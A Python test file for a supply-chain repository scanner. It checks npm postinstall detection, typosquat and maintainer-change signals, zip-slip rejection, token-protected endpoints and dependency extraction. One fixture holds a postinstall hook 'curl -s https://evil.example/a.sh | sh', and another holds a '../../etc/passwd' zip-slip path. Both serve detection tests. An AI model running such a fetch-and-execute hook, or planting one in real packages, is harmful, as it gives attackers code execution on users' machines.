from datetime import datetime, timezone
import io
import json
import os
import tarfile
import zipfile

from fastapi.testclient import TestClient

from main import app
from registry_clients import RegistryMetadataClient
from repo_scanner import scan_archive_bytes


def _build_tar_gz(entries: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in entries.items():
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def test_clean_repo_returns_honest_summary_without_false_safety_claim():
    raw = _build_tar_gz({"README.md": b"# Demo\n", "src/app.py": b"print('ok')\n"})
    res = scan_archive_bytes("demo.tar.gz", raw)
    assert res.status == "COMPLETED"
    assert res.score == 0
    assert res.findings == []
    assert "sin señales detectadas" in res.summary.lower()
    assert "seguro" not in res.summary.lower()


def test_detects_static_scripts_and_context_signals_with_explainable_score():
    pkg_json = json.dumps(
        {
            "name": "demo-app",
            "scripts": {"postinstall": "curl -s https://evil.example/a.sh | sh"},
            "dependencies": {"typosquat-pkg": "1.0.0"},
        }
    ).encode("utf-8")
    raw = _build_tar_gz({"package.json": pkg_json})

    def fake_fetcher(url: str, _timeout: float):
        if "typosquat-pkg" in url:
            return {
                "time": {
                    "created": "2026-11-18T10:00:00Z",
                    "1.0.0": "2026-11-18T10:00:00Z",
                    "2.0.0": "2026-11-19T10:00:00Z",
                },
                "dist-tags": {"latest": "2.0.0"},
                "maintainers": [{"name": "new-actor"}],
                "versions": {
                    "1.0.0": {"_npmUser": {"name": "orig-dev"}},
                    "2.0.0": {
                        "_npmUser": {"name": "new-actor"},
                        "scripts": {"postinstall": "node index.js"},
                    },
                },
            }
        return None

    client = RegistryMetadataClient(fetcher=fake_fetcher)
    res = scan_archive_bytes(
        "demo.tar.gz",
        raw,
        registry_client=client,
        advisory_lookup=lambda eco, pkg: {"id": "MAL-2026-0001"} if pkg == "typosquat-pkg" else None,
        now=datetime(2026, 11, 20, 12, 0, tzinfo=timezone.utc),
    )

    rule_ids = {f.rule_id for f in res.findings}
    assert "NPM-POSTINSTALL-EXEC-01" in rule_ids
    assert "PKG-MALICIOUS-ADVISORY-01" in rule_ids
    assert "PKG-NEW-OR-RECENT-01" in rule_ids
    assert "PKG-MAINTAINER-CHANGE-01" in rule_ids
    assert "PKG-TEMPORAL-CHAIN-01" in rule_ids
    assert res.score > 0
    assert len(res.score_breakdown) == len(res.findings)


def test_blocks_zip_slip_via_archive_safety():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../../etc/passwd", "root:x:0:0")
    try:
        scan_archive_bytes("slip.zip", buf.getvalue())
        assert False, "Debió rechazar zip-slip"
    except ValueError as exc:
        assert "ruta insegura" in str(exc).lower()


def test_repo_scan_endpoints_require_internal_service_token(monkeypatch):
    monkeypatch.setenv("INTERNAL_SERVICE_TOKEN", "test-internal-token-32-bytes-minimum")
    client = TestClient(app)
    raw = _build_tar_gz({"README.md": b"# Clean\n"})

    unauth = client.post(
        "/api/repo/scan",
        files={"file": ("demo.tar.gz", raw, "application/gzip")},
    )
    assert unauth.status_code == 401

    headers = {"X-Internal-Service-Token": "test-internal-token-32-bytes-minimum"}
    ok = client.post(
        "/api/repo/scan",
        headers=headers,
        files={"file": ("demo.tar.gz", raw, "application/gzip")},
    )
    assert ok.status_code == 200
    body = ok.json()
    assert body["status"] == "COMPLETED"
    fetch = client.get(f"/api/repo/scan/{body['scan_id']}", headers=headers)
    assert fetch.status_code == 200
    assert fetch.json()["scan_id"] == body["scan_id"]


def test_extracts_normalized_dependencies_and_purls_from_multiple_ecosystems():
    raw = _build_tar_gz(
        {
            "package.json": json.dumps({"dependencies": {"lodash": "^4.17.21"}}).encode("utf-8"),
            "requirements.txt": b"fastapi==0.115.0\n",
            "Cargo.toml": b'[dependencies]\nserde = "1.0.210"\n',
        }
    )
    res = scan_archive_bytes("deps.tar.gz", raw)
    by_eco = {d["ecosystem"]: d for d in res.dependencies}
    assert by_eco["npm"]["name"] == "lodash"
    assert by_eco["npm"]["purl"] == "pkg:npm/lodash@4.17.21"
    assert by_eco["pypi"]["name"] == "fastapi"
    assert by_eco["pypi"]["purl"] == "pkg:pypi/fastapi@0.115.0"
    assert by_eco["cargo"]["name"] == "serde"
    assert by_eco["cargo"]["purl"] == "pkg:cargo/serde@1.0.210"
